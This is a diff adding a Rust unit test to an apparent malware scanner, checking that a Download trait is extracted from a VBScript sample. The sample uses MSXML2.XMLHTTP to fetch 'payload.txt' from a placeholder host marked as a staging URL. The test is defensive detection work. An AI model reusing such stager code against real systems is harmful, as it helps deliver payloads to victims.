@@ -9836,6 +9836,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_inline_commented_binding() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = "http://vbs-inline-comment.example/payload.txt" ' staging URL
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-inline-comment.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS inline-commented URL binding: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_line_continuation_concat() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
